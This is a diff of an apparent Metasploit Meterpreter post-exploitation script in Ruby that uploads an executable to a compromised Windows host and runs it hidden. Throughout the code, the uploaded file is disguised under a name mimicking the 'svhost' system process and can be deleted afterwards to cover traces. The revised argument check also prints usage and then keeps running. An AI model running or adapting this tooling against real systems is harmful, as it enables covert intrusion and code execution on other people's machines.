@@ -1,54 +1,46 @@
 # $Id$
+
 session = client
 @@exec_opts = Rex::Parser::Arguments.new(
-	"-h" => [ false,"Help menu."                        ],
-	"-e" => [ true, "Executable or script to upload to target host."],
-	"-o" => [ true,"Options for executable."],
-	"-p" => [ false,"Path on target where to upload executable if none given %TEMP% directory will be used."],
-	"-v" => [ false,"Verbose, return output of execution of uploaded executable."],
-	"-r" => [ false,"Remove executable after running by deleting it of the file system."]
+	"-h" => [ false,"Help menu." ],
+	"-e" => [ true, "Executable or script to upload to target host." ],
+	"-o" => [ true, "Options for executable." ],
+	"-p" => [ false,"Path on target to upload executable, default is %TEMP%." ],
+	"-v" => [ false,"Verbose, return output of execution of uploaded executable." ],
+	"-r" => [ false,"Remove the executable after running it (only works if the executable exits right away)" ]
 )
 
 ################## function declaration Declarations ##################
 def usage()
-	print_line(
-		"Uploadexec Meterpreter Script\n" +
-		  "It has the functionality to upload a desired executable or script and execute\n"+
-		  "the file uploaded"
-	)
-	print_status("\n\t-h \t\tHelp menu.")
-	print_status("\t-e <opt> \tExecutable or script to upload to target host")
-	print_status("\t-o <opt> \tOptions for executable")
-	print_status("\t-p <opt> \tPath on target where to upload executable if none given %TEMP% directory will be used")
-	print_status("\t-v       \tVerbose, return output of execution of uploaded executable.")
-	print_status("\t-r       \tRemove executable after running by deleting it of the file system.")
+	print_line "UploadExec -- upload a script or executable and run it"
+	print_line(@@exec_opts.usage)
 end
 
 def upload(session,file,trgloc = "")
-        if not ::File.exists?(file)
-                raise "File to Upload does not exists!"
-        else
-                if trgloc == ""
-                location = session.fs.file.expand_path("%TEMP%")
-                else
-                        location = trgloc
-                end
-                begin
+	if not ::File.exists?(file)
+		raise "File to Upload does not exists!"
+	else
+		if trgloc == ""
+		location = session.fs.file.expand_path("%TEMP%")
+		else
+			location = trgloc
+		end
+		begin
 			ext = file.scan(/\S*(.exe)/i)
-            		if ext.join == ".exe"
-                                fileontrgt = "#{location}\\svhost#{rand(100)}.exe"
-                        else
-                                fileontrgt = "#{location}\\TMP#{rand(100)}#{ext}"
-                        end
-                        print_status("\tUploading #{file}....")
-                        session.fs.file.upload_file("#{fileontrgt}","#{file}")
-                        print_status("\t#{file} uploaded!")
-                        print_status("\tUploaded as #{fileontrgt}")
-                rescue ::Exception => e
-                        print_status("Error uploading file #{file}: #{e.class} #{e}")
-                end
-        end
-        return fileontrgt
+			if ext.join == ".exe"
+				fileontrgt = "#{location}\\svhost#{rand(100)}.exe"
+			else
+				fileontrgt = "#{location}\\TMP#{rand(100)}#{ext}"
+			end
+			print_status("\tUploading #{file}....")
+			session.fs.file.upload_file("#{fileontrgt}","#{file}")
+			print_status("\t#{file} uploaded!")
+			print_status("\tUploaded as #{fileontrgt}")
+		rescue ::Exception => e
+			print_status("Error uploading file #{file}: #{e.class} #{e}")
+		end
+	end
+	return fileontrgt
 end
 #Function for executing a list of commands
 def cmd_exec(session,cmdexe,opt,verbose)
@@ -59,7 +51,6 @@ def cmd_exec(session,cmdexe,opt,verbose)
 			print_status "\tRunning command #{cmdexe}"
 			r = session.sys.process.execute(cmdexe, opt, {'Hidden' => true, 'Channelized' => true})
 			while(d = r.channel.read)
-
 				print_status("\t#{d}")
 			end
 			r.channel.close
@@ -69,12 +60,12 @@ def cmd_exec(session,cmdexe,opt,verbose)
 		end
 	else
 		begin
-                        print_status "\trunning command #{cmdexe}"
-                        r = session.sys.process.execute(cmdexe, opt, {'Hidden' => true, 'Channelized' => false})
-                        r.close
-                rescue ::Exception => e
-                        print_status("Error Running Command #{cmd}: #{e.class} #{e}")
-                end
+			print_status "\trunning command #{cmdexe}"
+			r = session.sys.process.execute(cmdexe, opt, {'Hidden' => true, 'Channelized' => false})
+			r.close
+		rescue ::Exception => e
+			print_status("Error Running Command #{cmd}: #{e.class} #{e}")
+		end
 	end
 end
 def m_unlink(session, path)
@@ -93,32 +84,30 @@ verbose = 0
 remove = 0
 @@exec_opts.parse(args) { |opt, idx, val|
 	case opt
-
 	when "-e"
-		file = val
+		file = val || ""
 	when "-o"
 		cmdopt = val
 	when "-p"
 		path = val
-        when "-v"
-                verbose = 1
+	when "-v"
+		verbose = 1
 	when "-h"
 		helpcall = 1
-        when "-r"
+	when "-r"
 		remove = 1
 	end
 
 }
 
-if helpcall == 0 and file != ""
-        print_status("Running Upload and Execute Meterpreter script....")
-	exec = upload(session,file,path)
-	cmd_exec(session,exec,cmdopt,verbose)
-        if remove == 1
-                print_status("\tDeleting #{exec}")
-                m_unlink(session, exec)
-        end
-        print_status("Finnished!")
-elsif helpcall == 1 or file == ""
-	usage()
+if file == "" || cmdopt == nil || path == nil
+	usage
 end
+print_status("Running Upload and Execute Meterpreter script....")
+exec = upload(session,file,path)
+cmd_exec(session,exec,cmdopt,verbose)
+if remove == 1
+	print_status("\tDeleting #{exec}")
+	m_unlink(session, exec)
+end
+print_status("Finnished!")
